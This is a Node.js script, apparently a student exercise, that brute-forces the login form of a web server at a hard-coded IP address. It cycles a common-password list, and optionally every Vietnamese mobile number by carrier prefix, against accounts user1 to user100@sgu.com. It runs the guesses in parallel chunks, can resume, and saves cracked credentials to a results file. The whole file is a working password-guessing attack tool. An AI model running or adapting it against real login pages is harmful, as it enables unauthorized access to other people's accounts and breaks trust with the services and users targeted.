const fs = require("fs");
const axios = require("axios");

const File = {
  Result: "./data/result.txt",
  Removed: "./data/removed.txt",
  Passwords: "./data/passwords/1k-common-pass.txt",
};

const RemovedCombinations = [];

const getLines = (filePath) => {
  try {
    let fileContent = fs.readFileSync(filePath, "utf8");
    return fileContent.split("\n");
  } catch (e) {
    return [];
  }
};

const getUserLeft = (resultFile) => {
  let users = [];
  for (let i = 1; i <= 100; i++) {
    users.push(`user${i}@sgu.com`);
  }

  let checkedUsers = getLines(resultFile);
  checkedUsers = checkedUsers.map((up) => up.split(":")[0]);

  for (let u of checkedUsers) {
    let index = users.indexOf(u);
    if (index >= 0) {
      users.splice(index, 1);
    }
  }

  return users;
};

const checkAcc = async (username, password) => {
  const form = new URLSearchParams();
  form.append("email_signin", username);
  form.append("password_signin", password);
  form.append("login", "");

  let response = await axios.post("http://103.199.16.65/index.php", form, {
    Headers: {
      "Content-Type": "x-WWW-form-urlencoded",
    },
  });
  let correct =
    response.data.indexOf("Either email or password is incorrect.") < 0;

  return correct;
};

const checkAccPromiseAny = (username, passwords, excludes = []) => {
  return new Promise(async (resolve, reject) => {
    let correctPass = null;

    for (let password of passwords) {
      // loại nếu nằm trong excludes array
      if (excludes.indexOf(username + ":" + password) >= 0) {
        console.log("[!] Excluded " + username + ":" + password);
      } else {
        // check API
        let correct = false;
        let failed = false;
        try {
          correct = await checkAcc(username, password);
        } catch (e) {
          console.log("Error: " + e.message);
          failed = true;
        }

        // correct pass
        if (correct) {
          correctPass = password;
          break;
        }

        // wrong pass
        else if (!failed) {
          console.log(
            `[x] Removed [${RemovedCombinations.length}] ${username} ${password}`
          );
          RemovedCombinations.push(username + ":" + password);

          // save removed to file
          if (RemovedCombinations.length > 50) {
            console.log(`[-] Writing 50 removed to file...`);
            fs.appendFileSync(
              File.Removed,
              RemovedCombinations.join("\n") + "\n"
            );
            RemovedCombinations.length = 0;
          }
        }
      }
    }

    reject({ username, password: correctPass });
  });
};

const bruteForce = (users, passwords, chunk = 100, excludes = []) => {
  return new Promise((resolve, reject) => {
    let chunkSize = Math.floor(passwords.length / chunk);

    console.log(
      "[-]",
      "BruteForce with " + chunk + " password chunks.",
      chunkSize + " passwords/chunk."
    );

    let endCount = 0;

    for (let u of users) {
      let promises = [];

      for (let j = 0; j < chunk; j++) {
        let chunkPass = passwords.slice(j * chunkSize, (j + 1) * chunkSize);
        // console.log("pass chunk: ", chunkPass);
        promises.push(checkAccPromiseAny(u, chunkPass, excludes));
      }

      Promise.race(promises)
        .then((error) => {})
        .catch((result) => {
          let { username, password } = result;

          if (password == null) {
            console.log("[x] Not Found Pass For", username);
          } else {
            console.log(`[+] Found ${username}, ${password}`);
            fs.appendFileSync(File.Result, username + ":" + password + "\n");
          }

          console.log("[!] End checking " + username);
          endCount++;

          if (endCount == users.length) {
            console.log("[!] -------- Finished Brute Force --------");
            resolve();
          }
        });
    }
  });
};

// popular passwords
const popular_pass_bruteforce = async () => {
  const passwords = getLines(File.Passwords);
  const users = getUserLeft(File.Result).reverse();
  const excludes = getLines(File.Removed);

  console.log("Found " + passwords.length + " passwords.");
  console.log(`Found ${users.length} users left.`);
  console.log(`Found ${excludes.length} combinations removed.`);
  console.log("Starting ...");

  let userChunk = 2;
  let passwordChunk = 3;
  for (let i = 0; i < users.length / userChunk; i++) {
    console.log("[-] Begin user chunk", i);

    await bruteForce(
      users.slice(i, i + userChunk),
      passwords,
      passwordChunk,
      excludes
    );

    console.log("[-] Finish user chunk", i);
  }
};

// phone number viet nam
// sdt 10 so
const DauSoMoi = {
  Viettel: "098,086,096,097,032,033,034,035,036,037,038,039",
  Vinaphone: "088,091,094,083,084,085,081,082",
  Mobifone: "089,090,093,070,079,077,076,078",
  Vietnammoblie: "092,056,058",
  Gmobile: "099,059",
};

const addZero = (numstr, len) => {
  let result = numstr + "";
  for (let i = result.length; i < len; i++) {
    result = "0" + result;
  }
  return result;
};

const phone_pass_bruteforce = async () => {
  const users = getUserLeft(File.Result);
  const excludes = getLines(File.Removed);

  for (hang in DauSoMoi) {
    let listDauSo = DauSoMoi[hang].split(",");
    console.log("[*] Process " + hang + ":");

    let phones = [];
    for (let dauso of listDauSo) {
      console.log("[*] Dau so " + dauso);

      for (let i = 0; i < 999999; i++) {
        phones.push(dauso + addZero(i, 7));

        if (phones.length > 100000) {
          console.log("[...] Brute force " + phones.length + " phone numbers.");
          // await bruteForce(users, phone, 1);

          let userChunk = 3;
          for (let i = 0; i < users.length / userChunk; i++) {
            console.log("[-] Begin user chunk", i, "with phone", phones);

            await bruteForce(
              users.slice(i, i + userChunk),
              phones,
              1,
              excludes
            );

            console.log("[-] Finish user chunk", i);
          }

          phones = [];
        }
      }
    }
  }
};

// ---------- Main -----------
const main = () => {
  popular_pass_bruteforce();
  // phone_pass_bruteforce();
  // 0890800026, 0860300011, 0880200063
};

main();

// ---------- Utils -----------
const getUsersIdFromFile = (file) => {
  const users = getLines(file);
  const userIds = users.map((u) => Number(u.split("@")[0].split("user")[1]));
  const userIdSorted = userIds.sort((a, b) => a - b);

  console.log(users);
  console.log(userIdSorted);

  return userIdSorted;
};

// getUsersIdFromFile(File.Result);

const getUsersNotCheckedYet = () => {
  const userIdFoundPass = getUsersIdFromFile(File.Result);
  const userIdChecked = getUsersIdFromFile(File.Removed);
  const userIdNotChecked = [];

  for (let i = 1; i <= 100; i++) {
    if (userIdChecked.indexOf(i) < 0 && userIdFoundPass.indexOf(i) < 0) {
      userIdNotChecked.push(i);
    }
  }

  console.log(userIdNotChecked);
  return userIdNotChecked;
};

// getUsersNotCheckedYet();

// xóa những combinations của những user dã tìm thấy pass
const cleanRemovedFile = () => {
  const knownUserId = getUsersIdFromFile(File.Result);
  const removedCombinations = getLines(File.Removed);
  const foundId = [];

  console.log("original", removedCombinations.length);

  for (let r of removedCombinations) {
    let rId = Number(r.split("@")[0].split("user")[1]);
    let found = false;

    for (let ku of knownUserId) {
      if (ku == rId) {
        found = true;
        break;
      }
    }

    if (found) {
      foundId.push(rId);
    }
  }

  for (let i = removedCombinations.length - 1; i > 0; i--) {
    let r = removedCombinations[i];
    let n = Number(r.split("@")[0].split("user")[1]);
    if (foundId.indexOf(n) >= 0) {
      removedCombinations.splice(i, 1);
    }
  }

  console.log("cleaned", removedCombinations.length);

  fs.writeFileSync(File.Removed, removedCombinations.join("\n") + "\n");
};

// cleanRemovedFile();

const writeUsersLeftToFile = () => {
  const usersLeft = getUserLeft(File.Result);

  fs.writeFileSync("./data/users.txt", usersLeft.join("\n") + "\n");
};

// writeUsersLeftToFile();
